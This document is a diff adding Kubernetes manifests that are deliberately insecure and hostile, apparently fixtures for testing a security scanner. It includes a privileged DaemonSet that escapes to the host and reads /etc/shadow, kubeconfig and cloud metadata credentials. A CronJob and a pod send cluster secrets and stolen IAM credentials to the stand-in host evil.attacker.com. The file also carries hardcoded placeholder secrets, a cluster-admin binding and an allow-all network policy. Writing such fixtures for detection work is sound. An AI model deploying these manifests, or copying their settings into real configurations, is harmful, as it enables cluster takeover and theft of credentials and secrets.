@@ -1,0 +1,279 @@
+---
+# Doc 1: DaemonSet with privileged node access on every host
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: node-agent-malicious
+  namespace: kube-system
+  labels:
+    app: node-agent
+spec:
+  selector:
+    matchLabels:
+      app: node-agent
+  template:
+    metadata:
+      labels:
+        app: node-agent
+    spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      serviceAccountName: default
+      automountServiceAccountToken: true
+      tolerations:
+        - key: node-role.kubernetes.io/master
+          effect: NoSchedule
+        - operator: Exists
+      containers:
+        - name: node-scout
+          image: alpine:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c "
+                cat /etc/shadow;
+                cat /root/.kube/config;
+                curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/;
+              "
+          securityContext:
+            privileged: true
+            runAsUser: 0
+            allowPrivilegeEscalation: true
+            readOnlyRootFilesystem: false
+            capabilities:
+              add:
+                - SYS_ADMIN
+                - SYS_PTRACE
+                - NET_ADMIN
+                - DAC_OVERRIDE
+                - AUDIT_WRITE
+          env:
+            - name: C2_SERVER
+              value: "http://evil.attacker.com:4444"
+            - name: EXFIL_KEY
+              value: "c2-beacon-token-abc123xyz"
+          volumeMounts:
+            - name: host-root
+              mountPath: /host
+              readOnly: false
+            - name: host-proc
+              mountPath: /host/proc
+            - name: docker-sock
+              mountPath: /var/run/docker.sock
+            - name: host-ssh
+              mountPath: /host/root/.ssh
+          resources: {}
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
+        - name: host-proc
+          hostPath:
+            path: /proc
+        - name: docker-sock
+          hostPath:
+            path: /var/run/docker.sock
+        - name: host-ssh
+          hostPath:
+            path: /root/.ssh
+
+---
+# Doc 2: CronJob that exfiltrates data to an external endpoint
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: data-exfil-job
+  namespace: default
+spec:
+  schedule: "*/5 * * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          serviceAccountName: default
+          automountServiceAccountToken: true
+          restartPolicy: OnFailure
+          containers:
+            - name: exfil
+              image: curlimages/curl:latest
+              command: ["/bin/sh", "-c"]
+              args:
+                - |
+                  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
+                  curl -sk https://$KUBERNETES_SERVICE_HOST/api/v1/secrets --header "Authorization: Bearer $TOKEN" \
+                    | curl -X POST http://evil.attacker.com:9000/collect -d @-;
+                  kubectl get secrets --all-namespaces -o yaml | \
+                    curl -X POST http://evil.attacker.com:9000/secrets -d @-;
+              env:
+                - name: EXFIL_ENDPOINT
+                  value: "http://evil.attacker.com:9000/collect"
+                - name: DB_PASSWORD
+                  value: "Passw0rd!SuperSecret"
+                - name: SLACK_WEBHOOK
+                  value: "https://hooks.slack.com/services/FAKE/FAKE/faketoken"
+              securityContext:
+                runAsUser: 0
+                privileged: true
+                allowPrivilegeEscalation: true
+              resources: {}
+
+---
+# Doc 3: StatefulSet with hardcoded credentials and no security context
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: insecure-database
+  namespace: default
+spec:
+  serviceName: "insecure-db"
+  replicas: 1
+  selector:
+    matchLabels:
+      app: insecure-db
+  template:
+    metadata:
+      labels:
+        app: insecure-db
+    spec:
+      serviceAccountName: default
+      automountServiceAccountToken: true
+      securityContext: {}
+      containers:
+        - name: db
+          image: postgres:latest
+          imagePullPolicy: Always
+          securityContext:
+            runAsUser: 0
+            allowPrivilegeEscalation: true
+            readOnlyRootFilesystem: false
+          env:
+            - name: POSTGRES_USER
+              value: "admin"
+            - name: POSTGRES_PASSWORD
+              value: "admin123"
+            - name: POSTGRES_DB
+              value: "production"
+            - name: AWS_ACCESS_KEY_ID
+              value: "AKIAIOSFODNN7EXAMPLE"
+            - name: AWS_SECRET_ACCESS_KEY
+              value: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+            - name: ENCRYPTION_KEY
+              value: "aes256-hardcoded-key-do-not-use"
+          ports:
+            - containerPort: 5432
+              hostPort: 5432
+          resources:
+            limits: {}
+            requests: {}
+          volumeMounts:
+            - name: data
+              mountPath: /var/lib/postgresql/data
+            - name: host-root
+              mountPath: /host
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
+  volumeClaimTemplates: []
+
+---
+# Doc 4: ServiceAccount with cluster-admin and automount enabled
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: overprivileged-sa
+  namespace: default
+automountServiceAccountToken: true
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: overprivileged-sa-cluster-admin
+subjects:
+  - kind: ServiceAccount
+    name: overprivileged-sa
+    namespace: default
+roleRef:
+  kind: ClusterRole
+  apiGroup: rbac.authorization.k8s.io
+  name: cluster-admin
+
+---
+# Doc 5: NetworkPolicy that allows all ingress and egress (no isolation)
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-all-traffic
+  namespace: default
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+    - Egress
+  ingress:
+    - {}
+  egress:
+    - {}
+
+---
+# Doc 6: Pod with init container performing lateral movement via SSRF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: ssrf-lateral-pod
+  namespace: default
+spec:
+  hostNetwork: true
+  serviceAccountName: overprivileged-sa
+  automountServiceAccountToken: true
+  initContainers:
+    - name: metadata-stealer
+      image: curlimages/curl:latest
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /shared/creds.txt;
+          curl -s http://169.254.170.2/v2/credentials > /shared/ecs-creds.txt;
+      volumeMounts:
+        - name: shared-data
+          mountPath: /shared
+      securityContext:
+        runAsUser: 0
+        privileged: true
+  containers:
+    - name: c2-beacon
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          pip install requests --quiet;
+          python3 -c "
+          import requests, os
+          creds = open('/shared/creds.txt').read()
+          requests.post('http://evil.attacker.com:9000/creds', data=creds)
+          "
+      securityContext:
+        privileged: true
+        runAsUser: 0
+        allowPrivilegeEscalation: true
+        capabilities:
+          add:
+            - ALL
+      env:
+        - name: API_SECRET
+          value: "hardcoded-api-secret-9f8e7d6c"
+        - name: GITHUB_TOKEN
+          value: "ghp_FakeTokenForTestingPurposesOnly12345"
+      volumeMounts:
+        - name: shared-data
+          mountPath: /shared
+        - name: docker-sock
+          mountPath: /var/run/docker.sock
+  volumes:
+    - name: shared-data
+      emptyDir: {}
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
